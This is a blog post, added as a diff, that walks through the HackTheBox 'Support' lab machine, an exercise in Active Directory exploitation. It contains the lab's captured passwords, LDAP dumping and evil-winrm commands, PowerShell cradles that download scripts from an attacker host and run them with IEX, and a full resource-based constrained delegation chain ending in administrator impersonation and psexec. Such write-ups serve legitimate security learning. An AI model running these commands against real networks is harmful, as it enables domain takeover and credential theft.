@@ -1,0 +1,207 @@
+---
+title: HackTheBox - Support
+date: 2022-08-05
+tags:
+    - hackthebox
+    - tech
+---
+
+An "easy" machine, focused on active directory exploitation.
+
+I start out scanning this box like I would any other.
+
+I have a script that runs [rustscan](https://github.com/RustScan/RustScan), then
+feeds that output into nmap to use it's scripting engine.
+
+Then, formats that out to make it a bit easier to parse through.
+
+```
+#!/bin/bash
+# Want to overwrite the nmap results, but not the folders
+
+ip=$1
+output=~/code/htb
+mkdir -p $output/$ip
+echo "Currently Scanning: $ip"
+sudo rustscan -a $ip -- -A -sV -oG $output/$ip/initial.nmap $ip
+echo "Finished scanning: "
+out=$(cat $output/$ip/initial.nmap)
+
+echo "printing out"
+echo "$out"
+echo "done printing out"
+
+formatted=$(echo "$out" | grep -m 2 "^Host" | tail -n1 | cut -d' ' -f2,4- | awk '{print "Host: " $1 " Ports: " NF-1; $1=""; for(i=2; i<=NF; i++) { a=a" "$i; }; split(a,s,","); for(e in s) { split(s[e],v,"/"); printf "%-8s %s/%-7s %s | %s\n" , v[2], v[3], v[1], v[5], v[7]}; a="" }')
+
+echo "printing formatted"
+echo "$formatted"
+echo "done printing formatted"
+
+echo "$formatted" > $output/$ip/formatted.nmap
+
+sudo rm $output/$ip/initial.nmap
+```
+
+... and the output for the scan:
+
+```
+Host: 10.129.81.70 Ports: 80
+open     tcp/ 53     domain | Simple DNS Plus
+open     tcp/ 88     kerberos-sec | Microsoft Windows Kerberos (server time: 2022-08-05 16:31:16Z)
+open     tcp/ 135    msrpc | Microsoft Windows RPC
+open     tcp/ 139    netbios-ssn | Microsoft Windows netbios-ssn
+open     tcp/ 389    ldap | Microsoft Windows Active Directory LDAP (Domain: support.htb0.
+         / Site: Default-First-Site-Name)  |
+open     tcp/ 445    microsoft-ds? |
+open     tcp/ 464    kpasswd5? |
+open     tcp/ 593    ncacn_http | Microsoft Windows RPC over HTTP 1.0
+open     tcp/ 636    tcpwrapped |
+open     tcp/ 3268   ldap | Microsoft Windows Active Directory LDAP (Domain: support.htb0.
+         / Site: Default-First-Site-Name)  |
+open     tcp/ 3269   tcpwrapped |
+open     tcp/ 5985   http | Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)
+open     tcp/ 9389   mc-nmf | .NET Message Framing
+open     tcp/ 49375  msrpc | Microsoft Windows RPC
+open     tcp/ 49664  msrpc | Microsoft Windows RPC
+open     tcp/ 49668  msrpc | Microsoft Windows RPC
+open     tcp/ 49670  ncacn_http | Microsoft Windows RPC over HTTP 1.0
+open     tcp/ 49682  msrpc | Microsoft Windows RPC
+open     tcp/ 49699  msrpc | Microsoft Windows RPC
+```
+
+I always hate windows boxes because the initial scan says so much - but also so little.
+
+I begun my enumeration by just seeing if there are open shares.
+
+```
+smbclient -L //support.htb                                                                     INT ✘
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Password for [WORKGROUP\matthew]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	support-tools   Disk      support staff tools
+	SYSVOL          Disk      Logon server share
+```
+
+We're able to connect to the `support-tools` share by doing `smbclient //support.htb/support-tools`, and are greeted
+with a list of various `.exe` files.
+
+```
+smb: \> ls
+  .                                   D        0  Wed Jul 20 12:01:06 2022
+  ..                                  D        0  Sat May 28 06:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022
+```
+
+I noticed that the only non-standard binary here was `UserInfo.exe`, and figured
+I'd probably want to do something like that.
+
+My first was to try and get the thing to run and analyze it with 
+
+[dnSpy](https://github.com/dnSpy/dnSpy)
+
+But, that involved setting up a VM, and I didn't _really_ want to do that if I didn't have to.
+
+After spelunking for a bit, I realized that this is simply making requests to a
+server, and those can be probably captured with wireshark.
+
+After all, they do provide us with a windows version in the support tools folder...
+
+Making a simple request with wine + capturing network traffic on tun0, I can
+view one of the bind requests to see a password being sent off.
+
+[](/images/wireshark.png)
+
+
+`support\nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
+
+With these credentials, can dump ldap `ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldapdump.txt`
+
+But, the better command is to specifically dump the `support` user
+
+`ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=support,CN=Users,DC=support,DC=htb"`
+
+In the output, we find one line that looks particularly suspicious
+
+```
+    ~/code/htb/support.htb  cat ldapdump.txt                                                                                   ✔
+# extended LDIF
+#
+# LDAPv3
+# base <CN=support,CN=Users,DC=support,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# support, Users, support.htb
+...
+info: Ironside47pleasure40Watchful
+...
+
+```
+
+### Logging in with WINRM
+
+It looks like a password, so testing it with WinRM gets a shell, and the user flag!
+
+`evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful`
+
+### Enumerating with Bloodhound
+
+
+##### Setting up neo4j
+```
+docker run \                                                                                                        INT ✘
+    --publish=7474:7474 --publish=7687:7687 \
+    --volume=$HOME/neo4j/data:/data \
+    neo4j
+
+```
+
+Create credentials by going to browser at `localhost:7474
+
+
+Download cradle:
+`(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/Powermad.ps1') | IEX`
+`(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/PowerView.ps1') | IEX`
+
+
+https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall
+
+
+```
+1. Get the required modules loaded into system
+(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/Powermad.ps1') | IEX
+(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/PowerView.ps1') | IEX
+
+
+# Create a "computer" that we control, that has ability to create service tickets for anything
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+Get-DomainComputer DC.SUPPORT.HTB | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+
+# Generate Kerberos Ticket for Administrator on Behalf of the newly created attackersystem
+getST.py -spn cifs/DC.SUPPORT.HTB -impersonate administrator -dc-ip support.htb SUPPORT.HTB/attackersystem:Summer2018!
+
+# Login using Ticket with PSEXEC
+export KRB5CCNAME=/home/matthew/code/htb/support.htb/administrator.ccache 
+psexec.py support.htb/administrator@dc.support.htb -k -no-pass 
+```
